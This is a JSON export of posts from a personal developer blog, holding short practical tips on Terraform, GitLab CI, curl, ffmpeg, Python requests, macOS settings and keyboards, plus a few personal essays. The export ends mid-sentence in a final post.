[{"content":"Working with make commands can be tiresome. Especially when those makefiles are really long and you do not know what commands are in them or you cannot remember what the commands are named.\nHere is a neat little trick to help with that.\nmake list\n\u0026lt;Makefile\u0026gt; test: echo \u0026#34;testing\u0026#34; build: echo \u0026#34;building\u0026#34; deploy: echo \u0026#34;deploying\u0026#34; list: @grep \u0026#39;^[^#[:space:]].*:\u0026#39; Makefile | sort just add the extra list command to a makefile like this\nlist: @grep \u0026#39;^[^#[:space:]].*:\u0026#39; Makefile | sort and then when you run it you get\n$ make list test: build: deploy: ","permalink":"https://ridingintraffic.github.io/posts/2023-12-15-make_list/","summary":"Working with make commands can be tiresome. Especially when those makefiles are really long and you do not know what commands are in them or you cannot remember what the commands are named.\nHere is a neat little trick to help with that.\nmake list\n\u0026lt;Makefile\u0026gt; test: echo \u0026#34;testing\u0026#34; build: echo \u0026#34;building\u0026#34; deploy: echo \u0026#34;deploying\u0026#34; list: @grep \u0026#39;^[^#[:space:]].*:\u0026#39; Makefile | sort just add the extra list command to a makefile like this","title":"makefile list"},{"content":"Follow the redirect road Sometimes you want to have a curl command that traces the redirects and lets you see hops that it makes along the way\nlong story short do this\ncurl -sLD - http://test.chrislatta.org/myredirect.html -o /dev/null it will look like this\n$ curl -sLD - http://test.chrislatta.org/myredirect.html -o /dev/null HTTP/1.1 301 Moved Permanently Content-Type: text/html; charset=iso-8859-1 Content-Length: 244 Connection: keep-alive Location: http://test.chrislatta.org/hop1.html HTTP/1.1 301 Moved Permanently Content-Type: text/html; charset=iso-8859-1 Content-Length: 244 Connection: keep-alive Location: http://test.chrislatta.org/hop2.html HTTP/1.1 301 Moved Permanently Content-Type: text/html; charset=iso-8859-1 Content-Length: 244 Connection: keep-alive Location: http://test.chrislatta.org/lost.html HTTP/1.1 200 OK Content-Type: text/html Content-Length: 287 Connection: keep-alive Host-Header: 192fc2e7e50945beb8231a492d6a8024 Accept-Ranges: bytes This output shows that that there are three redirects, or \u0026#34;hops\u0026#34;, occurring: http://test.chrislatta.org/hop1.html http://test.chrislatta.org/hop2.html http://test.chrislatta.org/lost.html ","permalink":"https://ridingintraffic.github.io/posts/2023-12-15-follow-redirects/","summary":"Follow the redirect road Sometimes you want to have a curl command that traces the redirects and lets you see hops that it makes along the way\nlong story short do this\ncurl -sLD - http://test.chrislatta.org/myredirect.html -o /dev/null it will look like this\n$ curl -sLD - http://test.chrislatta.org/myredirect.html -o /dev/null HTTP/1.1 301 Moved Permanently Content-Type: text/html; charset=iso-8859-1 Content-Length: 244 Connection: keep-alive Location: http://test.chrislatta.org/hop1.html HTTP/1.1 301 Moved Permanently Content-Type: text/html; charset=iso-8859-1 Content-Length: 244 Connection: keep-alive Location: http://test.","title":"tracing redirects"},{"content":"keyboard mounts this is the easiest cleanest and cheapest way I have found to mount a split keyboard.\nthe sticker that you apply to the keyboard case has adhesive and can be bought in a multi pack\nthese are great because they are pretty cheap and their height is less that your standard silicon bumpon, therefore you can have the bumpons for feet and they will sit nicely on any flat surface when not mounted\nMagnetic Wireless Charger Universal Metal Rings\namazon link Magnetic Wireless Charger Universal Metal Rings\nthe tripod mount is ULANZI MK-01 Continuity Camera Mount for MacBook\namazon link ULANZI MK-01 Continuity Camera Mount for MacBook I like to use desk mounts to hold everything in place at my standing desk.\nCAMVATE Universal C-Clamp for Desktop Mount\namazon link CAMVATE Universal C-Clamp for Desktop Mount the tripods as well as clamps for things that are not flat are good too. it is often cheaper to find a bundle on the clamp and tripod of your choosing so find what works for your setup\nCAMVATE Super Clamp Articulated Mini Ball Head\namazon link CAMVATE Super Clamp Articulated Mini Ball Head\nSMALLRIG Super Camera Clamp Mount, Double Ball Head Adapter\namazon link SMALLRIG Super Camera Clamp Mount, Double Ball Head Adapter\n","permalink":"https://ridingintraffic.github.io/posts/2023-10-27-keyboad_mounts/","summary":"keyboard mounts this is the easiest cleanest and cheapest way I have found to mount a split keyboard.\nthe sticker that you apply to the keyboard case has adhesive and can be bought in a multi pack\nthese are great because they are pretty cheap and their height is less that your standard silicon bumpon, therefore you can have the bumpons for feet and they will sit nicely on any flat surface when not mounted","title":"keyboard-mounts"},{"content":"It turns out that if you were using terraform.io as a remote state only situation, hashicorp is upping the price to a price per resource model and making things really expensive. It is now time to migrate from tf.io to s3 and not pay a ton of money..\nBLADE And never again have to pay for a service that would be dirt cheap... RAZOR ...IF it weren\u0026#39;t run by a bunch of profiteering gluttons! migrating and syncing state between tf.io and s3. you can have different remotes in different branches. if you dont care about the state at all then when you switch branches go in and rm -rf .terraform/ this will wipe anything that terraform had setup locally and then use the remote of the branch to do things. if you want to migrate from terraform.io to s3 then do this. do\n# migration git checkout \u0026lt;terraform-io branch\u0026gt; rm -rf .terraform/ tf init tf plan # looks good no changes expected git checkout \u0026lt;s3 remote branch\u0026gt; tf init -migrate-state tf plan # looks good no changes there you have it your s3 remote is up to date from your latest stuff.\nthen you can go in and delete the tf.io workspace and continue on with your life.\n# syncing tf.io-current-state to s3-outdated-state git checkout \u0026lt;terraform-io branch\u0026gt; rm -rf .terraform/ tf init tf plan # looks good no changes expected git checkout \u0026lt;s3 remote branch\u0026gt; tf init -migrate-state # here you will get a warning saying eeek there is something already in s3 do you want to continue # you answer yes # you can avoid this error by manually deleting the tfstate file in the s3 bucket as well but you do you tf plan # looks good no changes profit\n","permalink":"https://ridingintraffic.github.io/posts/2023-09-15-tfstate-migration/","summary":"It turns out that if you were using terraform.io as a remote state only situation, hashicorp is upping the price to a price per resource model and making things really expensive. It is now time to migrate from tf.io to s3 and not pay a ton of money..\nBLADE And never again have to pay for a service that would be dirt cheap... RAZOR ...IF it weren\u0026#39;t run by a bunch of profiteering gluttons!","title":"tfstate-migration"},{"content":"adeventures in old technology so there is an application called minimodem and it will transmit and receive data at various bps etc. why not see what it takes to move a 1.5mb file. cause lol\nbase64 -i img.jpg|minimodem --tx 9600 --ascii -f 9600.wav ffmpeg -i 9600.wav 9600.mp3 ffmpeg -i 9600.mp3 9600.wav minimodem --rx 9600 -f 9600.wav|base64 -d \u0026gt;img_output9600.png at 9600 bps the file is 36 minutes long. and 120mb once in mp3 its 17mb.\nif i were to play if from one audio source to another it would take 36 minutes to move the data only on audio.\nbut it worked and the file moved and converted back lol why, i dont know but it was fun.\nhttps://manpages.ubuntu.com/manpages/focal/man1/minimodem.1.html\n","permalink":"https://ridingintraffic.github.io/posts/2023-08-24-minimodem/","summary":"adeventures in old technology so there is an application called minimodem and it will transmit and receive data at various bps etc. why not see what it takes to move a 1.5mb file. cause lol\nbase64 -i img.jpg|minimodem --tx 9600 --ascii -f 9600.wav ffmpeg -i 9600.wav 9600.mp3 ffmpeg -i 9600.mp3 9600.wav minimodem --rx 9600 -f 9600.wav|base64 -d \u0026gt;img_output9600.png at 9600 bps the file is 36 minutes long. and 120mb once in mp3 its 17mb.","title":"2023-08-24-minimodem"},{"content":"terraform targeting https://github.com/ridingintraffic/ridingintraffic.github.com/wiki/code_sre#terraform-targetingd Yes you are supposed to never use a targeted plan and apply in terraform becuase it is the violation of the Infra as code creed. But you know what sometimes you just gotta do a thing and get it done. Then you never want to remember your shame and as a result you go and forget how to do that thing. so here it is\nterraform plan -target=\u0026#34;aws_appautoscaling_scheduled_action.app_scheduled_down\u0026#34; -target=\u0026#34;aws_appautoscaling_scheduled_action.app_scheduled_up\u0026#34; input=false -compact-warnings -out plan-dev.tfplan apply\nterraform apply -target=\u0026#34;aws_appautoscaling_scheduled_action.app_scheduled_down\u0026#34; -target=\u0026#34;aws_appautoscaling_scheduled_action.app_scheduled_up\u0026#34; ","permalink":"https://ridingintraffic.github.io/posts/2023-08-18-terraform_targeting/","summary":"terraform targeting https://github.com/ridingintraffic/ridingintraffic.github.com/wiki/code_sre#terraform-targetingd Yes you are supposed to never use a targeted plan and apply in terraform becuase it is the violation of the Infra as code creed. But you know what sometimes you just gotta do a thing and get it done. Then you never want to remember your shame and as a result you go and forget how to do that thing. so here it is\nterraform plan -target=\u0026#34;aws_appautoscaling_scheduled_action.","title":"terraform targeting"},{"content":"gitlab and exit codes Sometimes gitlab will have a command or a script that runs and it will not trap an exit code properly.\nThis results in an error condition happening in a script, but the job in the pipeline to come back green.\nhere is some meat and context around the issue as well. https://gitlab.com/gitlab-org/gitlab-runner/-/issues/25394 and then a bit more here https://gitlab.com/gitlab-org/gitlab/-/merge_requests/77601 and then of course it still isn\u0026rsquo;t fixed as of today\u0026rsquo;s writing https://gitlab.com/gitlab-org/gitlab/-/issues/383355 I have no idea exactly why this happens but this is one way that you can trap the exit code and then emit it for a job. i\u0026rsquo;ve done it this way and it works at least as of 07012023 so who knows your mileage may vary\nmake_thing: stage: something script: - set +e #making apt quieter https://peteris.rocks/blog/quiet-and-unattended-installation-with-apt-get/ - export DEBIAN_FRONTEND=noninteractive - apt-get update -qq \u0026amp;\u0026amp; apt-get install -y -qq --no-install-recommends apt-utils - apt-get install -qq -y -o Dpkg::Use-Pty=0 gcc libglib2.0-0 libsm6 libxrender1 libxext6 unzip curl zip - curl \u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34; -o \u0026#34;awscliv2.zip\u0026#34; - unzip -qq awscliv2.zip - ./scripts/i_do_a_thing.sh || EXIT_CODE=$? - exit $EXIT_CODE aws arm and amd there are times that the gitlab-runner is going to toss an error during the docker build.\nit will look like this: failed to get destination image \u0026ldquo;sha256:2a7a208f3483cb09eb7afdfda6aca1f25b1ce5ccce8daae830492d53a79a983b\u0026rdquo;: image with reference sha256:2a7a208f3483cb09eb7afdfda6aca1f25b1ce5ccce8daae830492d53a79a983b was found but does not match the specified platform: wanted linux/amd64, actual: linux/arm64/v8 this is curious and kind of obvious when you see it\ndocker build --platform \u0026#34;linux/amd64\u0026#34; -t $IMAGE_URL:$IMAGE_TAG . echo Pushing the Docker image... docker push $IMAGE_URL:$IMAGE_TAG if the gitlab runner is on an AWS runner that is intel based and NOT AMD the error does not manifest cause ¯_(ツ)_/¯\nThe solution is to remove the amd arch targeting\ndocker build -t $IMAGE_URL:$IMAGE_TAG . the arch targeting was put in place as a cover your butt tactic because if you were to build on a Mac for apple silicon then you are building for ARM and if the ARM image is not run on arm hardware then things blow up.\n","permalink":"https://ridingintraffic.github.io/posts/2023-08-17-gitlab_exit_codes_aws_arm_building/","summary":"gitlab and exit codes Sometimes gitlab will have a command or a script that runs and it will not trap an exit code properly.\nThis results in an error condition happening in a script, but the job in the pipeline to come back green.\nhere is some meat and context around the issue as well. https://gitlab.com/gitlab-org/gitlab-runner/-/issues/25394 and then a bit more here https://gitlab.com/gitlab-org/gitlab/-/merge_requests/77601 and then of course it still isn\u0026rsquo;t fixed as of today\u0026rsquo;s writing https://gitlab.","title":"gitlab exit codes aws arm building"},{"content":"Was the audio too quiet on something that you recorded?\nAre you lazy and you don\u0026rsquo;t want to drop in the file to a timeline editor just so you can gain boost?\nmost laptops will have ffmpeg on them, and if your mac doesnt then a simple brew install ffmpeg https://formulae.brew.sh/formula/ffmpeg\nffmpeg -i \u0026#34;your_input_file.mp4\u0026#34; -vcodec copy -filter:a \u0026#34;volume=15dB\u0026#34; \u0026#34;your_output_file.mp4\u0026#34; there you have it short and simple now your video file is louder.\n","permalink":"https://ridingintraffic.github.io/posts/2023-08-14-audio_boost/","summary":"Was the audio too quiet on something that you recorded?\nAre you lazy and you don\u0026rsquo;t want to drop in the file to a timeline editor just so you can gain boost?\nmost laptops will have ffmpeg on them, and if your mac doesnt then a simple brew install ffmpeg https://formulae.brew.sh/formula/ffmpeg\nffmpeg -i \u0026#34;your_input_file.mp4\u0026#34; -vcodec copy -filter:a \u0026#34;volume=15dB\u0026#34; \u0026#34;your_output_file.mp4\u0026#34; there you have it short and simple now your video file is louder.","title":"boost audio on video file"},{"content":"I am a leaf on the wind, watch how I soar. this is an old post from 2018 that I never added here but I thought it was still relevant today - Roll with the punches, go with the flow, make it up as you go… People always say that you should stay flexible with your plans. Don’t be afraid to change things. Never in my wildest dreams would I fully understand what it means to live a life of constant improvisation than when we had our first child.\nJust over a month ago we welcomed our baby girl in to the world. From the get go it has been a situation where we think we can make a plan and that plan gets thrown out the window.\nOh you want to have a natural birth? Nope, sorry baby girl is breach you are having a c-section. Alright, lets roll with it we will handle it and everything is fine.\nWe have a nursery and a crib setup for the baby. Nope, she doesn’t want to sleep in there she will sleep in your arms instead. Ok, we can do this lets work out a plan where we rotate shifts through the night and someone will always be awake to take care of her. This has worked for the first month and it has been tiring but it works.\nI have learned a great many lessons in this first month but the most important one of all is make a plan, but assume that the plan will go up in smoke as soon as it is started. Yes, making a plan will at least get people out the door but the first step after exiting that door everything will change. Making a plan will also allow to think out possibilities and contingencies, because believe it, those are going to become crucial. Then look for the path of least resistance and make like “a leaf on the window and see how I soar.”\nIt all seems like anecdotal advice but I firmly believe that the more flexible a person can be the easier time they will have. If I had not had the ability to just roll with things, then I can see much more stress and anxiety. Everything will work itself out eventually and it may not be according to plan. Thats ok, as long as the end result is safe and healthy then what does it matter that the path to get there was not one that could have even been foreseen from the beginning.\nChildren are certainly turning out to be the craziest learning on my feet boot camp anyone could ever go through. What worked today won’t work tomorrow and what soothed the baby 5 minutes ago has stopped working now.\n“We’re going on an adventure!” Embrace the ride and keep your eyes open along the way because the sight and scenes that you will experience will stay with you for a lifetime. Take in all those little moments with your child and enjoy the smiles and stares they give you. It most certainly has been an adventure so far and I can’t wait to see where we go from here.\n","permalink":"https://ridingintraffic.github.io/posts/2023-08-13-improvisation/","summary":"I am a leaf on the wind, watch how I soar. this is an old post from 2018 that I never added here but I thought it was still relevant today - Roll with the punches, go with the flow, make it up as you go… People always say that you should stay flexible with your plans. Don’t be afraid to change things. Never in my wildest dreams would I fully understand what it means to live a life of constant improvisation than when we had our first child.","title":"improvisation as a way of life"},{"content":"base64 user auth in requests use the base64 for the first header and then reuse the bearer token that you get back.\nimport requests import json from requests.auth import HTTPBasicAuth headers = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;application/json\u0026#39; } base_url = \u0026#39;https://www.something.com\u0026#39; token_url = \u0026#34;/tauth/1.0/token/\u0026#34; url=base_url + token_url response = requests.post(url, headers=headers, auth=HTTPBasicAuth(USER, PASSWORD)) data = response.json() #reusing that bearer token from the repsonse headers = { \u0026#39;Authorization\u0026#39;: f\u0026#34;Bearer {data[\u0026#39;token\u0026#39;]}\u0026#34;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;application/json\u0026#39; } url=\u0026#34;/something/\u0026#34; response=requests.get( url, headers=headers) data = response.json() using jq with terraform taking a terraform plan and outputting only the things that will change on the plan. such as only the resource names.\nthis is useful when you need to do some targeted deploys.\nterraform plan -input=false -compact-warnings -out plan.tfplan; terraform show -no-color -json plan.tfplan | jq -r \u0026#39;.resource_changes[] | select(.change.actions[0]==\u0026#34;update\u0026#34; or .change.actions[0]==\u0026#34;create\u0026#34; or .change.actions[0]==\u0026#34;create\u0026#34;) | .address\u0026#39; ","permalink":"https://ridingintraffic.github.io/posts/2023-05-23-jq-terraform-python-requests/","summary":"base64 user auth in requests use the base64 for the first header and then reuse the bearer token that you get back.\nimport requests import json from requests.auth import HTTPBasicAuth headers = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;application/json\u0026#39; } base_url = \u0026#39;https://www.something.com\u0026#39; token_url = \u0026#34;/tauth/1.0/token/\u0026#34; url=base_url + token_url response = requests.post(url, headers=headers, auth=HTTPBasicAuth(USER, PASSWORD)) data = response.json() #reusing that bearer token from the repsonse headers = { \u0026#39;Authorization\u0026#39;: f\u0026#34;Bearer {data[\u0026#39;token\u0026#39;]}\u0026#34;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;application/json\u0026#39; } url=\u0026#34;/something/\u0026#34; response=requests.","title":"python base64 requests jq and terraform"},{"content":"Getting dictionaries back from a http endpoint usually results in a mess of objects. Dealing with this in python can be a challenge of ValueError exceptions. so what is the easiest way to handle this? a nested get. if the object looks like\nmessage={\u0026#34;detail\u0026#34;:{\u0026#34;operation\u0026#34;:\u0026#34;create\u0026#34;}} then you can access it like this\nmessage.get(\u0026#39;detail\u0026#39;, {}).get(\u0026#39;operation\u0026#39;) then if you access something that doesn\u0026rsquo;t exist you will get a nice None back\n\u0026gt;\u0026gt;\u0026gt; print(message.get(\u0026#39;detail\u0026#39;, {}).get(\u0026#39;notoperation\u0026#39;)) None hurray safe handling of missing values\n","permalink":"https://ridingintraffic.github.io/posts/2023-04-27-python-nesting/","summary":"Getting dictionaries back from a http endpoint usually results in a mess of objects. Dealing with this in python can be a challenge of ValueError exceptions. so what is the easiest way to handle this? a nested get. if the object looks like\nmessage={\u0026#34;detail\u0026#34;:{\u0026#34;operation\u0026#34;:\u0026#34;create\u0026#34;}} then you can access it like this\nmessage.get(\u0026#39;detail\u0026#39;, {}).get(\u0026#39;operation\u0026#39;) then if you access something that doesn\u0026rsquo;t exist you will get a nice None back\n\u0026gt;\u0026gt;\u0026gt; print(message.get(\u0026#39;detail\u0026#39;, {}).","title":"python nested dictionary access"},{"content":"Sometimes you just need a single file from a git repo. I know that this is not the typical way we use git, but sometimes you just need to do a thing.\nSo I want a single file, how do i do that?\ngit archive --format=tar --remote=ssh://git@github.com:someuser/somefile.git{main} -- my_file_name |tar xf - and like that you can snag one file from one repo and get on with your life.\n","permalink":"https://ridingintraffic.github.io/posts/2023-03-03-single-file-git/","summary":"Sometimes you just need a single file from a git repo. I know that this is not the typical way we use git, but sometimes you just need to do a thing.\nSo I want a single file, how do i do that?\ngit archive --format=tar --remote=ssh://git@github.com:someuser/somefile.git{main} -- my_file_name |tar xf - and like that you can snag one file from one repo and get on with your life.","title":"git single file"},{"content":"Terraform depends pattern without depends_on.\nOr how to use hcl to leverage its interal dependancy handling, to to hard things for you.\nWe are going to use an example of an aws sqs queue, dlq, and queue policy all strung together. The issue that I ran in to was I wanted to create all of these using a single list of words as my seed values. Then the issue arose around using a for_each with a dynamic resource group when terraform would need group 1 to be appied before it knew what to setup for group 2. Terraform was not happy about this and it was known as a big ball of ugh.\nLets dive in then.\nFirst we start with a set of locals, which is just a set of words.\nlocals { list_of_things = toset([\u0026#34;bird\u0026#34;, \u0026#34;dog\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;puppy\u0026#34;, \u0026#34;fish\u0026#34;]) } Then we need to construct a group of sqs queues, policies and dlqs.\nIn order to create a sqs with dlq we needed to have the dlq first.\nThis is because of the dlq needed to be referenced in the sqs.\nresource \u0026#34;aws_sqs_queue\u0026#34; \u0026#34;list_of_things_dlq\u0026#34; { for_each = local.list_of_things name = \u0026#34;the_thing${each.value}_dlq\u0026#34; delay_seconds = 0 max_message_size = 8192 message_retention_seconds = 86400 # 2592000 = 30 days receive_wait_time_seconds = 10 } Alright now we have the dlq and this is going to be the only time that we reference the local directly.\nNext we are going to create the group of sqs taking in the dlq and then doing a cute little replace to clean it up.\nThis is going to ensure that the dlq is spun up first because the for_each here is looking at the queue name for the original loop and then feeding the name value in to the queue name with a little regex scrub, and also using the actual dlq name for the deadLetterTargetARN.\nresource \u0026#34;aws_sqs_queue\u0026#34; \u0026#34;list_of_things\u0026#34; { for_each = aws_sqs_queue.list_of_things_dlq name = replace(each.value.name, \u0026#34;_dlq\u0026#34;, \u0026#34;\u0026#34;) delay_seconds = 0 max_message_size = 8192 # probably want to up this ... limit is 262144 message_retention_seconds = 86400 # 24 hours receive_wait_time_seconds = 10 redrive_policy = jsonencode({ deadLetterTargetArn = each.value.arn maxReceiveCount = 4 }) } Finally we are going to create the queue policies for the dlq and the regular queue by for_each-ing over the queues individually. Thus setting up a nice bit of recursion to handle all this.\n## dlq policies resource \u0026#34;aws_sqs_queue_policy\u0026#34; \u0026#34;list_of_things_dlq\u0026#34; { for_each = aws_sqs_queue.list_of_things_dlq queue_url = each.value.id policy = \u0026lt;\u0026lt;POLICY { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;${each.value.name}-policy\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;allowgrxaccount\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;AWS\u0026#34;: [ \u0026#34;arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\u0026#34; ] }, \u0026#34;Action\u0026#34;: \u0026#34;SQS:SendMessage\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;${each.value.arn}\u0026#34; } ] } POLICY } ## regular queue policy resource \u0026#34;aws_sqs_queue_policy\u0026#34; \u0026#34;list_of_things\u0026#34; { for_each = aws_sqs_queue.list_of_things queue_url = each.value.id policy = \u0026lt;\u0026lt;POLICY { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;${each.value.name}-policy\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;allowgrxaccount\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;AWS\u0026#34;: [ \u0026#34;arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\u0026#34; ] }, \u0026#34;Action\u0026#34;: \u0026#34;SQS:SendMessage\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;${each.value.arn}\u0026#34; } ] } POLICY } Well, there you have it. This is a neat little bit of recursion and dependancy fun in order to spin up a tree of resources dynamically and with only a limited number of change permutations.\n","permalink":"https://ridingintraffic.github.io/posts/2023-02-10-terraform-depends-without/","summary":"Terraform depends pattern without depends_on.\nOr how to use hcl to leverage its interal dependancy handling, to to hard things for you.\nWe are going to use an example of an aws sqs queue, dlq, and queue policy all strung together. The issue that I ran in to was I wanted to create all of these using a single list of words as my seed values. Then the issue arose around using a for_each with a dynamic resource group when terraform would need group 1 to be appied before it knew what to setup for group 2.","title":"terraform depends without depends_on"},{"content":"Just another basic reminder for a thing that I fixed with my laptop when it was acting odd and weird;\nI was working on my mac and I kept encouring a weird behavior where certain keys that were held down would not repeat, but would pop up a prompt on my screen to enter some kind of special accented internantionl character.\nIn macOS, when a key is held down while entering text, a popup is shown which lets one choose between various accented forms of the character. To disable this execute the following command line in the Terminal.app:\ndefaults write -g ApplePressAndHoldEnabled -bool false\nNow, you\u0026rsquo;ll need to log out and log back in. This should disable the display of the popup and character typed should start repeating when the key is held down.\nIf you ever wish to return to this behaviour, execute the following command line in the Terminal.app:\ndefaults write -g ApplePressAndHoldEnabled -bool true\nYou\u0026rsquo;ll need to log out and log back in again for the setting to take effect.\n","permalink":"https://ridingintraffic.github.io/posts/2023-02-09-hold-for-accent/","summary":"Just another basic reminder for a thing that I fixed with my laptop when it was acting odd and weird;\nI was working on my mac and I kept encouring a weird behavior where certain keys that were held down would not repeat, but would pop up a prompt on my screen to enter some kind of special accented internantionl character.\nIn macOS, when a key is held down while entering text, a popup is shown which lets one choose between various accented forms of the character.","title":"macos text entering weirdness"},{"content":"bug in zmk fancy keyboards use a controller called a nice nano, that nice nano runs a firmware called zmk. That firmware has a fair few options to configure a few things.\nOne of the nice options is deep sleep, which powers things down to save battery on the board when not in use. Many people argue that this feature eliminates the need for a physical battery switch. However there is a bug with mac that is/was waking up the mac from sleep eventhough the \u0026ldquo;keyboard is alseep\u0026rdquo; You can fix it with.\nCONFIG_ZMK_SLEEP=y # Enable deep sleep support CONFIG_ZMK_IDLE_SLEEP_TIMEOUT=900000 # Milliseconds of inactivity before entering deep sleep open issue about the bug https://github.com/zmkfirmware/zmk/issues/1273\n","permalink":"https://ridingintraffic.github.io/posts/2023-02-01-zmk-mac-power/","summary":"bug in zmk fancy keyboards use a controller called a nice nano, that nice nano runs a firmware called zmk. That firmware has a fair few options to configure a few things.\nOne of the nice options is deep sleep, which powers things down to save battery on the board when not in use. Many people argue that this feature eliminates the need for a physical battery switch. However there is a bug with mac that is/was waking up the mac from sleep eventhough the \u0026ldquo;keyboard is alseep\u0026rdquo; You can fix it with.","title":"wireless zmk mac sleep waking bug"},{"content":"writing directly to cloudwatch logs sometimes you just need to write to a cloudwatch log and you want to do that from the terminal? You can do this with jq bash and aws cli yey\ntimestamp=$(date +%s000); \\ json_data=$(jq --null-input --arg timestamp $timestamp \u0026#39;{\u0026#34;timestamp\u0026#34;: ($timestamp|tonumber), \u0026#34;message\u0026#34;: \u0026#34;ssn: 123-12-1234\u0026#34;}\u0026#39;); \\ aws logs put-log-events --log-group-name /dev/ridigintraffic --log-stream-name something-special --log-events \u0026#34;$json_data\u0026#34; ","permalink":"https://ridingintraffic.github.io/posts/2023-01-31-cloudwatch-logs/","summary":"writing directly to cloudwatch logs sometimes you just need to write to a cloudwatch log and you want to do that from the terminal? You can do this with jq bash and aws cli yey\ntimestamp=$(date +%s000); \\ json_data=$(jq --null-input --arg timestamp $timestamp \u0026#39;{\u0026#34;timestamp\u0026#34;: ($timestamp|tonumber), \u0026#34;message\u0026#34;: \u0026#34;ssn: 123-12-1234\u0026#34;}\u0026#39;); \\ aws logs put-log-events --log-group-name /dev/ridigintraffic --log-stream-name something-special --log-events \u0026#34;$json_data\u0026#34; ","title":"fun with cloudwatch logs"},{"content":"i mesed up my back over the weekend i spent a couple of days on the floor. This was because i messed up my back. This is mostly becuase I have really poor posture. I have had really poor posture for a good 35 years now. It is likley that the poor posture is finally catching up to me. So what do we do when bad things like this happen? We make a whole bunch of changes to things and then revert a number of those changes but hopefully one or two of those changes will stick. Along with a number of stretches and exercises that I have started doing, I have also configured my keyboard into a vertical alignment. Well it is nearly a vertical alignment. The conversion was pretty easy using a couple of printed parts and some tripod things that I had laying around. It was also shockinly easy for me to type on because I have been using a split keyboard for the last 5 years. A result of the split keyboard conversion all those years ago, was that I became a really good touch typist. I had all these bad habits on a regular keyboard that all went away when I switched to the split. Then when I switched to the vertical split all the same muscle memory was already there and pretty much nothing changed. My typing speed and error rate got back to normal after about 30 minutes and it has felt great.\nwhy a vertical keyboard Now why switch to a vertical keyboard? Part of my posture issues are the \u0026ldquo;forward neck posture\u0026rdquo; whhich is essentially \u0026ldquo;smart phone neck\u0026rdquo; it is also a result of sitting at a keyboard all day with my palms facing down. This angles the shoulder blades out and pushes the neck forward. You can get around this by angling the hands up with the thumbs up, this drives the shoulder blades down and helps pull the neck back. I like it and I think that I am going to continue this for a bit and see if I can make my posture more better. I will prolly write up a longer blog post about all of this with the split boards then the vertical boards and links to everything, but I figured that I could at least get some of this word vomit out now.\n","permalink":"https://ridingintraffic.github.io/posts/2023-01-17-vertical-keyboard/","summary":"i mesed up my back over the weekend i spent a couple of days on the floor. This was because i messed up my back. This is mostly becuase I have really poor posture. I have had really poor posture for a good 35 years now. It is likley that the poor posture is finally catching up to me. So what do we do when bad things like this happen? We make a whole bunch of changes to things and then revert a number of those changes but hopefully one or two of those changes will stick.","title":"vertical keyboards"},{"content":"building keyboards good surface mount diodes https://www.mouser.com/ProductDetail/821-1N4148WRHG\n","permalink":"https://ridingintraffic.github.io/posts/2022-10-07-building-keyboards-notes/","summary":"building keyboards good surface mount diodes https://www.mouser.com/ProductDetail/821-1N4148WRHG","title":"building keyboard notes"},{"content":"open a finder in the terminal of a mac if you need to open a finder window you can just type open or if you want to open the finder with the folder that you are in as the path you can type open . and like that you have magically opened the folder and you are good to go.\n","permalink":"https://ridingintraffic.github.io/posts/2022-10-07-open-folder-terminal/","summary":"open a finder in the terminal of a mac if you need to open a finder window you can just type open or if you want to open the finder with the folder that you are in as the path you can type open . and like that you have magically opened the folder and you are good to go.","title":"open a folder from terminal"},{"content":"Microware muting Ok fine usually I will talk about tech things and IT things, but this is a quality of life thing. It turns out that you can mute your microwave. While i never thought that this would be a thing, it does make really good sense and yea, that should be a thing. 30 seconds later I googled \u0026ldquo;mute microwave\u0026rdquo; and low and behold.\nwhirlpool microwave: keypad mute: press and hold 1 for 3 seconds hear \u0026#34;beep beep\u0026#34; end of cycle mute: pread and hold 2 for 3 seconds hear \u0026#34;beep beep\u0026#34; ","permalink":"https://ridingintraffic.github.io/posts/2022-09-12-muting-a-microware/","summary":"Microware muting Ok fine usually I will talk about tech things and IT things, but this is a quality of life thing. It turns out that you can mute your microwave. While i never thought that this would be a thing, it does make really good sense and yea, that should be a thing. 30 seconds later I googled \u0026ldquo;mute microwave\u0026rdquo; and low and behold.\nwhirlpool microwave: keypad mute: press and hold 1 for 3 seconds hear \u0026#34;beep beep\u0026#34; end of cycle mute: pread and hold 2 for 3 seconds hear \u0026#34;beep beep\u0026#34; ","title":"muting a microwave"},{"content":"rip grep tip I use ripgrep all the time and often times there are little things that can really help you find what you are serarching for. This is one of them.\nI want to find a string in a specific filename that exists in many folders. Then I want to display those resutls with some context.\nrg \u0026#39;.wait:\u0026#39; -g \u0026#39;.gitlab-ci.yml\u0026#39; --context 5 The string that I am searching for is .wait: The filename that I want to search in is .gitlab-ci.yml I want to display 5 lines before and 5 lines after what I found.\n","permalink":"https://ridingintraffic.github.io/posts/2022-09-06-ripgrep-filename-context-search/","summary":"rip grep tip I use ripgrep all the time and often times there are little things that can really help you find what you are serarching for. This is one of them.\nI want to find a string in a specific filename that exists in many folders. Then I want to display those resutls with some context.\nrg \u0026#39;.wait:\u0026#39; -g \u0026#39;.gitlab-ci.yml\u0026#39; --context 5 The string that I am searching for is .","title":"ripgrep file context"},{"content":"player 2(040) has entered the game. During the past 2 years if you had not noticed, there has been a chip 